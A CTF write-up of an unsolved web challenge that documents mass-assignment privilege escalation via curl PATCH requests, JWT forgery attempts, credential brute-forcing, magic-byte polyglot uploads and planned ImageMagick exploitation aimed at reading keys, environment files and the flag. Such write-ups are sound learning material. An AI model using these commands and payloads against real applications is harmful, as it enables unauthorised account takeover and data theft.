# OnboardX — KPMG CTF Web Challenge (Partial Progress / Full Forensic Writeup)

> **Challenge**: Onboardx — Web — 30 pts
> **Title / Hint**: *"if you can onboard yourself, why do u need an HR/Admin"*
> **Target**: `http://kicyber-00f338d978e5-onboardx-0-0.chals.io` (HTTP → HTTPS redirect, openresty reverse proxy → `gunicorn` Flask backend)
> **Date of testing**: Sun, 11 Oct 2026
> **Status**: **NOT SOLVED (flag not retrieved)** — extensive recon + several confirmed vulnerabilities and one fully-working privilege-escalation primitive. This document preserves all evidence, tools, scripts, payloads and next-step hypotheses so the challenge can be finished later.

---

## 1. Executive Summary

| Item | Result |
|---|---|
| Target | `https://kicyber-00f338d978e5-onboardx-0-0.chals.io` |
| Backend | Python Flask (`gunicorn`), reverse-proxied by `openresty/1.27.1.2` |
| Auth | Flask session cookie (pending users) + `JWT RS256` `token` cookie (approved users), JWKS published at `/.well-known/jwks.json` (`kid=prod-rsa-key-2026`) |
| **Confirmed vuln #1** | **Mass assignment on `PATCH /api/user/me`** — an unprivileged pending user can set `role=admin`, `is_approved=true`, `display_name`, `bio`, `theme` |
| Confirmed vuln #2 | **Weak upload validation** — `PATCH`able via avatar upload gated only by extension whitelist (`.jpg/.jpeg/.png/.gif`) + **magic bytes** (PNG/GIF/JPEG signature). Content is otherwise unrestricted |
| Confirmed vuln #3 | **ImageMagick 6** is used server-side (`X-Powered-By: ImageMagick/6` on `/profile` and `/directory`) — likely the RCE/SMSS-read vector used by the *ID-card generation pipeline* |
| Confirmed vuln #4 | **Decoy / broken secrets in client JS** — expired/staging API key and a "dead end" note |
| Unknown vuln (reached) | `/admin` returns `403 {"error":"forbidden"}` for every request. It requires a **valid RS256 JWT with `role=admin`**. All JWT forgery / algorithm-confusion / kid-path-traversal attempts failed |
| Flag | **Not obtained.** Required admin JWT (or RCE to steal the RSA private key / read flag file). |

**Main blocker**: the login endpoint always issues a JWT with `role:"user"` even after the DB record is mass-assigned to `role:admin`. The admin gate checks the **JWT claim**, not the DB, so self-onboarding alone does not open `/admin`.

---

## 2. Reconnaissance

### 2.1 Initial fingerprint

```http
GET /  ->  301 Moved Permanently  (openresty -> https)
GET https://.../ -> 200
Server: openresty/1.27.1.2        (edge proxy)
Server: gunicorn                  (origin, every page/API response)
Content-Type: text/html; charset=utf-8
```

### 2.2 Visible pages / endpoints (HTTP status map)

| Path | Status | Notes |
|---|---|---|
| `/` | 200 | Landing page |
| `/robots.txt` | 200 | `Disallow: /legacy-admin/`, `Disallow: /internal/` (both 404 externally) |
| `/login`, `/register` | 200 | Forms (POST) |
| `/dashboard` | 200 (auth) | Pending/approved status banner, calls `/api/user/me` |
| `/directory` | 200 (auth) | Approved employees; `X-Powered-By: ImageMagick/6` |
| `/profile` | 200 (auth, token) | Avatar upload + preview; `X-Powered-By: ImageMagick/6`; leaks stored path `/app/app/static/uploads/...` |
| `/settings` | 200 (auth) | Theme (disabled), "Download my data" → `/settings/export` |
| `/settings/export` | 200 | `{"note":"Your export will be emailed within 24 hours.","status":"queued"}` |
| `/api` | 200 | API docs (unauthenticated) |
| `/api/user/me` | 200 | GET / PATCH (auth) |
| `/.well-known/jwks.json` | 200 | JWT public key (unauthenticated) |
| `/admin` | **403** | `{"error":"forbidden"}` for ALL GET; `405` for POST; `200 Allow:` for OPTIONS |
| `/legacy-admin/`, `/internal/` | 404 | robots.txt hint, not reachable from outside |
| `/static/uploads/<file>` | 200 | avatar files |
| Everything else fuzzed | 404 | see §9 |

### 2.3 Clues from HTML/JS

* Every page carries a comment:
  ```html
  <!--
    TODO(dave): retire the legacy PHP admin panel once everyone is migrated
    to the new /admin dashboard. -mgmt
  -->
  ```
* `/static/js/main.js` (decoy secrets):
  ```js
  // NOTE: staging API key left in here by mistake, rotate before next deploy!
  // WNDR-STG-KEY: 8f2c1e9a-b70d-4b0a-inactive-do-not-use
  // (rotated 2025-11-02, this one is dead end — ignore)
  const API_BASE = "/api";
  // fetch(`${API_BASE}/auth/public-key`)  -> returns 404, stale reference
  ```
* `/careers` mentions *"Site Reliability Engineer — Remote — image processing pipeline"* (i.e. ImageMagick pipeline is "real").
* `/register` — *"New accounts are reviewed by HR within 48 hours before full access is granted."*
* `/profile` — *"HR reviews and generates the final ID card from this photo … The administrator will create your official OnboardX ID card from the profile update page."*
* `/dashboard` fetches `/api/user/me` and branches on `is_approved`.

### 2.4 API documentation (`GET /api`)

```json
{
  "api_version": "v1",
  "auth": "Approved users use the token cookie issued at /login. Pending users use the temporary session until approval. JWT verification keys are published through JWKS.",
  "description": "OnboardX internal portal API",
  "endpoints": {
    "GET  /.well-known/jwks.json": "JSON Web Key Set used to publish JWT verification keys",
    "GET  /api/user/me": "Return the authenticated user profile fields",
    "GET  /settings/export": "Queue a personal data export (returns status)",
    "PATCH /api/user/me": "Update editable profile fields (JSON body)"
  },
  "note": "Admin endpoints are not listed here. Discover them through the UI."
}
```

### 2.5 JWKS (`GET /.well-known/jwks.json`)

```json
{"keys":[{"alg":"RS256","e":"AQAB","kid":"prod-rsa-key-2026","kty":"RSA","n":"xD4jfmL2QO0XY54lckzWGUjfV8aVSyoeh4unWs_m4CBvUzIYDH19lg0xci0dK1GBF_41fG0dgo0D67HOh1Cz-2-s4Ev6mulcEV5ldE-AmXRM2gE5UJzepARdDbZL24s1KLq1dQOyQG5T_HPgkcifa6bw3omtWzHVXI6WidhHHSGbJGcvbWKWVXVxDA6EDPMtOJpPYf3qKcO1GzWHS3zE-CNpqmBOQayqs-OtgUbZNOmEdGq_wDPajsKKKfzUNmGfzyeRJ9DX_wBTlpy_M7LVEtBcxORt9z-J9C7pjLT6nsFkLyzdeQ3UdYn-dQmPGbKQaYcztlt6PBwTNeaBLpGiyw","use":"sig"}]}
```

Reconstructed RSA public key PEM (saved in `evidence/pub.pem`):

```
-----BEGIN PUBLIC KEY-----
MIIBCAKCAQEAxD4jfmL2QO0XY54lckzWGUjfV8aVSyoeh4unWs/m4CBvUzIYDH19
...
-----END PUBLIC KEY-----
```

---

## 3. Accounts created

| Username | User id | State | Notes |
|---|---|---|---|
| `hunter01` | 4 | approved + admin (mass-assigned) | main test account |
| `tester42` | — | pending | control pending user |
| `admin` | 6 | pending → self-approved/admin | duplicate of real admin name; login **fails** against real password, but after self-approval we CAN log in (token username=`admin`) |
| `nopeuser1` | 7 | pending | login → only session cookie, **no token** |

---

## 4. CONFIRMED VULNERABILITY #1 — Mass Assignment / Self-Onboarding

`PATCH /api/user/me` accepts fields beyond the intended editable set (`bio`, `theme`, `display_name`). It also accepts **`role`** and **`is_approved`**.

### 4.1 Reproduction (pending session cookie)

```bash
# register
curl -sk -X POST 'https://.../register' -d 'username=hunter01&password=Passw0rd!123'
# login -> session cookie (pending): {"pending_user_id":4}
curl -sk -c cj.txt -b cj.txt -X POST 'https://.../login' -d 'username=hunter01&password=Passw0rd!123'
# escalate role and self-approve WITHOUT HR
curl -sk -b cj.txt -X PATCH 'https://.../api/user/me' \
     -H 'Content-Type: application/json' \
     -d '{"role":"admin","is_approved":true}'
```

Response (HTTP 200):

```json
{"avatar_path":"","bio":"hello","display_name":"hunter01","id":4,
 "is_approved":true,"role":"admin","theme":"dark","username":"hunter01"}
```

### 4.2 Other accepted fields (whitelist mapping)

Tested field names and whether they modify the record:

| Field | Result |
|---|---|
| `bio`, `display_name`, `theme` | **applied** |
| `role` | **applied** (value arbitrary, e.g. `admin`, `superuser`, `user`) |
| `is_approved` | **applied** (bool cast) |
| `avatar_path` | ignored / regenerated |
| `username`, `id`, `user_id`, `sub` | ignored |
| `admin`, `is_admin`, `superuser`, `permissions`, `status`, `active`, `type`, … (24+ names) | ignored (no new fields added to response object) |

### 4.3 Impact

* Confirmed **privilege escalation in the DB** and **bypass of the HR approval step** (self-onboarding).
* Enables the approved-user token flow (pending users get only a session cookie; approved users get a JWT).
* Does **NOT** by itself yield a `role=admin` JWT (see §5).

---

## 5. The JWT — key observations (analysis blocker)

### 5.1 Two auth modes (confirmed by experimentation)

| Account state | `/login` response |
|---|---|
| Pending (unapproved) | `302 /dashboard`, sets `session` cookie only (`pending_user_id`), clears token |
| Approved (any role) | `302 /dashboard`, sets `token` (JWT RS256) + clears session |

### 5.2 JWT structure (issued to `hunter01`, sub=4, DB role = admin)

Header: `{"alg":"RS256","kid":"prod-rsa-key-2026","typ":"JWT"}`
Payload: `{"sub":4,"username":"hunter01","role":"user", ...}`

> **Critical**: even with `role=admin` in the DB (confirmed via `/api/user/me`), login **always** embeds `role:"user"` in the JWT.

A second account registered under the name `admin` (id 6), self-approved and set `role=admin`, logs in with a valid JWT carrying `username:"admin"` but **still `role:"user"`** — so the `/admin` gate is not username-based either.

### 5.3 Endpoint behaviour matrix (used to distinguish verification errors)

| Token | `/api/user/me` | `/admin` |
|---|---|---|
| none / garbage / wrong key / HS256-forged | `401 {"error":"authentication required"}` | `403 {"error":"forbidden"}` |
| valid RS256 `role=user` (real) | `200` | `403` |
| valid RS256 `role=user` username=`admin` | `200` | `403` |

Conclusion: `/admin` requires a **validly-signed RS256 token whose `role` claim == `"admin"`**. Private key → forge; or a real admin user in the `users` table.

### 5.4 JWT attack surface tested (all failed)

1. **alg: none** — rejected (401/403).
2. **alg confusion RS256→HS256** signed with the RSA public key in every plausible form:
   * full PEM (`-----BEGIN PUBLIC KEY----- …`),
   * one-line PEM,
   * raw base64url `n` (padded & unpadded),
   * DER bytes,
   * raw JWK JSON object,
   * `kid` unchanged (`prod-rsa-key-2026`) — all `401`.
   → The verifier strictly expects RS256 and loads the JWKS key.
3. **kid path traversal / remote file loading** — signed a token with our own RSA keypair and set `kid` to the uploaded public-key-rendered-as-PNG path in 7 forms (`uploads/<file>`, `/app/app/static/uploads/<file>`, `app/static/uploads/<file>`, `/app/static/uploads/<file>`, `static/uploads/<file>`, `/uploads/<file>`, bare filename) → all `401`. The verifier resolves the key via the **fixed `kid=prod-rsa-key-2026`** entry in JWKS, not via the token `kid` as a path.
4. **Weak-signature brute force** — no (2048-bit RSA).
5. **Login field injection** (`role=admin`, `is_admin=1`, etc. in POST body) → token still `role=user`.
6. **Weak admin credential guessing** (`admin`,`dave`,`hr`,… × common passwords) — no hits (see `evidence/brute.py`).

---

## 6. CONFIRMED VULNERABILITY #2 — Avatar uploads gated by magic bytes + extension only

Upload endpoint: `POST /profile` (multipart field `avatar`).

Rules confirmed by experiment:

1. **Extension whitelist** enforced on original filename → `\.(jpg|jpeg|png|gif)$` (case-insensitive). Anything else returns `Unsupported file type.` and HTTP 200.
2. **Magic-byte check** enforced on file **content** → must begin with PNG magic (`\x89PNG\r\n\x1a\n`), GIF magic (`GIF87a`/`GIF89a`), or JPEG magic (`\xff\xd8\xff`). Pure MVG/MSL/SVG/PDF/PostScript/BMP/WEBP content → `File does not look like a valid image.` (HTTP 200).
3. Complete/valid parse is **not** required: `PNG_MAGIC + random garbage` is accepted (`magic_garbage.png`, 208 bytes).
4. Stored filename is always `uploads/<id>_<uuid>.<orig-extension>` (extension taken from the last dot of the original name, whitelisted). No control over final name beyond extension.

Magic-gate corpora (results):

| Content prefix | filename=`u.png` | Result |
|---|---|---|
| `\x89PNG\r\n\x1a\n` + junk | accepted (302) | stored `.png` |
| `GIF89a` + junk | accepted (302) | stored `.png` |
| `\xff\xd8\xff` (SOI) + junk | accepted (302) | stored `.png` (JPEG magic) |
| `%PDF-...`, `%!PS...`, `<svg...`, `push graphic-context...` | **rejected** | `File does not look like a valid image.` |
| `RIFF....WEBP`, `BM...` | rejected | — |
| `filename=x.MVG` with PNG content | rejected | `Unsupported file type.` |

### 6.1 Side-channel discovery

`GET /profile` and `GET /directory` return:

```
X-Powered-By: ImageMagick/6
```

→ The server runs **ImageMagick 6** against avatar images (dimension identification / thumbnail generation / ID-card pipeline). The avatar also leaks `Stored image path: /app/app/static/uploads/<file>`, giving the app root layout: `/app/app/static/uploads/`.

### 6.2 ImageMagick exploitation attempts (blocked by magic gate)

* Classic **ImageTragick (CVE-2016-3714)** MVG `fill 'url(https://… "| <cmd>")'` → rejected by magic gate.
* MSL (`<?xml…<image>…`) → rejected / parsed as SVG by IM, not MSL (MSL needs `.msl` extension).
* GIF-magic + MVG-tailing polyglot: passes the app gate, but ImageMagick selects the **GIF** coder (first bytes win) and errors (`negative or zero image size`), payload never interpreted as MVG.
* PNG-magic + MVG-trailing polyglot: same — PNG coder wins.
* Because stored extension can only be `.png/.gif/.jpg`, and ImageMagick identifies format by content magic, we could not reach the `MVG`/`MSL`/`SVG` coders — the same magic bytes the gate requires are the bytes that force a safe coder.
* Ghostscript/PostScript path unusable (`%!PS` rejected by the gate).

**Unfinished**: a *valid* image that triggers an ImageMagick-6 decoder/`SVG·MVG`-injection bug (e.g. CVE-2026-56379 class) — requires determining the exact ImageMagick 6 version and crafting a **real** PNG/GIF/JPEG exploit. This would give SSRF/file-read/RCE → read RSA private key or flag from disk/env (`/proc/self/environ`, `/app/.env`, `/flag`).

### 6.3 kid→uploaded-key idea (b01lers-style) — already disproven, kept for the record

Attempted the classic *JWT `kid` path traversal to an attacker-uploaded public key* (see `evidence/attacker_*.pem`, `attacker_key.png`, tokens §5.4#3). All `401`. The JWKS `kid` is static and the public key fixed — this vector is dead.

---

## 7. Other observations

* `/settings/export` -> `{"note":"Your export will be emailed within 24 hours.","status":"queued"}` — only queued; no file/SSRF observed.
* `/directory` renders `<img src="/static/<avatar_path>">` (**missing `uploads/` segment**) — a 404 generation bug. All normal avatars are 404 in the directory while `/profile` uses the correct `/static/uploads/...` URL.
* `display_name`/`bio` are HTML-escaped in `/directory` (`&lt;img src=x onerror=alert(1)&gt;`), so **no stored XSS** via profile fields.
* `/static` path traversal attempts (double-encoding, `..%2f`, `....//`, NUL) → 404; no file disclosure.
* No `.git`, source tarballs, `/.env`, debug console, or error tracebacks exposed.
* Backend source path confirmed: application root is `/app/app/` (from the stored-image path).
* API fuzzing (`api-endpoints`, `raft-*`) only surfaced the documented routes; admin endpoints not enumerated on the root (possibly only reachable *from behind* an admin JWT, or via internal-only hosts `legacy-admin`, `internal` noted by robots.txt).

---

## 8. Attack-chain hypotheses / next steps (unfinished)

1. **Primary remaining route: RCE or file-read via ImageMagick 6.** Goal: read `/app/...` JWT private key (or `/flag`, env) → forge `role=admin` JWT → `/admin`.
   * Identify server ImageMagick 6 exact version (`X-Powered-By: ImageMagick/6` suggests 6.9.x). Probe by crafty valid-PNG/GIF/JPEG that triggers a unique crash/error signature.
   * Focus: ImageMagick **PNG/MNG/JNG** coders (share PNG-family magic — the only magic allowed) for a decoder-level bug, or the **SVG text-command injection (CVE-2026-56379)** if a crafted file can be made to reach the SVG coder (e.g., MNG/JNG trickery).
   * If file-read only: use ImageMagick `info:` / `caption:` / `label:` semantics through an embedded-resource coder to render an accessible file into the avatar output, then fetch it via `/static/uploads/...`.
2. **Internal services** (`/legacy-admin/`, `/internal/`): only 404 externally. If SSRF is established via ImageMagick (`url(https://internal...)`), enumerate `127.0.0.1` ports / internal hosts for the legacy PHP admin panel or JWT key service.
3. **ID-card generation pipeline**: the admin "profile update page" generates ID cards with ImageMagick from an upload (`/profile` hint). If a low-privilege endpoint can *enqueue* card generation (unfound as yet), the upload-path ImageMagick processing could be triggered by us directly.
4. **Re-check login role derivation**: determine whether the JWT `role` comes from a second table (`users`) vs. the mass-assignable record (`applicants`). If register/approve inserts a `users` row with role copied from the applicant, find any endpoint/race to trigger the copy for a self-made admin applicant.

---

## 9. Fuzzing summary

| Tool / method | Wordlist | Scope | Result |
|---|---|---|---|
| seq probe (curl) | ~60 hand-picked paths | root, api, admin variants | only known routes + `/admin` 403 |
| `ffuf` | test + api wordlists | — | connection/rate issues |
| Python `fuzz.py` (24 threads) | SecLists `api-endpoints.txt` | `/api/*` | only `/api/user/me` |
| Python `fuzz.py` | `raft-small-directories`, `raft-medium-directories` | `/` | only known pages; many connection resets (rate-limiting / WAF at openresty) |
| targeted POST probes | approve/promote/onboard/grant/activate/role | `/admin/*`, `/api/*` | all 404 |
| cookie/header tricks | `admin=1`, `role=admin`, `X-Forwarded-For` | `/admin` | all 403 |
| credential guessing | 30 common (user,pass) pairs | `/login` | none |

---

## 10. Evidence files (in `Onboardx/evidence/`)

| File | What it proves / contains |
|---|---|
| `resp_home.html`, `resp_login.html`, `resp_register.html` | raw pages + legacy-admin TODO comment |
| `resp_api.json` | official API docs |
| `resp_jwks.json` | RS256 public key / kid |
| `resp_robots.txt` | `/legacy-admin/` & `/internal/` hints |
| `resp_main.js` | decoy `WNDR-STG-KEY`, stale `/api/auth/public-key` |
| `resp_dashboard.html`, `resp_profile.html`, `resp_directory.html`, `resp_settings.html` | authenticated pages (avatar upload, bio escaping, X-Powered-By header, stored path leak) |
| `resp_apiuserme.json` | user object showing `role=admin`, `is_approved=true` after mass assignment |
| `resp_settings_export.json` | export queued |
| `resp_admin_full.txt`, `resp_admin.txt` | `/admin` → 403 `{"error":"forbidden"}` |
| `jwt_tokens.txt` | decoded JWTs (role=user despite DB admin) |
| `pub.pem`, `jwtforge.py` | reconstructed public key + HS256 forgery generator |
| `priv.pem`, `fake_admin.token` | attacker RSA keypair signed token (RS256, wrong key) used for fingerprinting |
| `attacker_pub.pem`, `attacker_priv.pem`, `attacker_key.png` | keys + uploaded "PNG" containing attacker public key (kid test) |
| `cj.txt`, `cj3.txt`, `cjT.txt`, `cjN.txt`, `admin6.tok` | cookie jars / tokens for `hunter01` and `admin`(id 6) |
| `brute.py` | admin credential brute-force script |
| `fuzz.py` | concurrent endpoint fuzzer |
| `t.png`, `tiny.gif`, `magic_garbage.png` | upload-gate test payloads (PNG magic + garbage accepted) |
| `gifswap.gif`, `m_gif_gif.gif`, `big.png`, `vsoi.jpg` | polyglot / magic-swap experiment payloads |
| `ascii.py`, `asr2.json` | attribute/JSON-response parsing helpers used during mass-assignment field mapping |
| `hs_tokens.txt` | all HS256 (alg-confusion) JWT forgery attempts and their 401 responses |
| `admintok.txt` | empty (placeholder for a would-be admin token — never obtained) |

Raw evidence is also preserved in `/tmp/opencode/` scripts and payloads referenced above.

---

## 11. Appendix — notable raw exchanges (redacted token)

### Login as approved user (token issued)

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=hunter01&password=Passw0rd!123

HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: token=eyJhbGciOiJSUzI1NiIsImtpZCI6InByb2QtcnNhLWtleS0yMDI2IiwidHlwIjoiSldUIn0.<payload>.<sig>; HttpOnly; Path=/; SameSite=Lax
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; ...
```

### PATCH /api/user/me (privilege escalation)

```http
PATCH /api/user/me HTTP/1.1
Cookie: token=<jwt>
Content-Type: application/json

{"role":"admin","is_approved":true}

HTTP/1.1 200 OK
{"avatar_path":"4_...png","bio":"...","display_name":"X","id":4,
 "is_approved":true,"role":"admin","theme":"dark","username":"hunter01"}
```

### /admin gate

```http
GET /admin HTTP/1.1
Cookie: token=<valid role=user JWT>

HTTP/1.1 403 FORBIDDEN
Content-Type: application/json

{"error":"forbidden"}
```

---

*Documented for the OnboardX (Web/Onboarding) challenge — assessment stopped prematurely; primary unsolved step: obtaining a valid `role=admin` RS256 JWT (via real admin account, ImageMagick-6-based RCE/file-read, or JWT signing-key disclosure).*